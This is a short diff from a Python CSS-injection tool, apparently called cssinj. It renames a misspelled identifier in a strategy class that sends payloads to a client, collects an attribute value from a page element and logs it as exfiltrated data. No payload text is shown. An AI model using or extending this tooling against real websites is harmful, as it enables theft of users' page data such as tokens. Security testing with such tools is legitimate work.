@@ -2,7 +2,7 @@ from cssinj.client import Client
 from cssinj.console import Console, LogLevel
 from cssinj.strategies.base import BaseExfiltrationStrategy
 from cssinj.utils.default import ELEMENTS
-from cssinj.utils.dom import Attribut, Element
+from cssinj.utils.dom import Attribute, Element
 
 
 class CompleteStrategy(BaseExfiltrationStrategy):
@@ -18,10 +18,10 @@ class CompleteStrategy(BaseExfiltrationStrategy):
         hostname: str,
         port: int,
         element: str = '*',
-        attribut: str = 'value',
+        attribute: str = 'value',
         timeout: float = 3.0,
     ) -> None:
-        super().__init__(hostname, port, element, attribut, timeout)
+        super().__init__(hostname, port, element, attribute, timeout)
 
     def generate_start_payload(self, client: Client) -> str:
         return self._generate_payload(client)
@@ -34,11 +34,11 @@ class CompleteStrategy(BaseExfiltrationStrategy):
 
     def handle_end(self, client: Client) -> str:
         element = Element(name=self.element)
-        element.attributs.append(Attribut(name=self.attribut, value=client.data))
+        element.attributes.append(Attribute(name=self.attribute, value=client.data))
         client.elements.append(element)
         Console.log(
             LogLevel.END_EXFILTRATION,
-            f'[{client.id}] - The {self.attribut} exfiltrated from {self.element} is : {client.data}',
+            f'[{client.id}] - The {self.attribute} exfiltrated from {self.element} is : {client.data}',
         )
         client.data = ''
         return 'end'
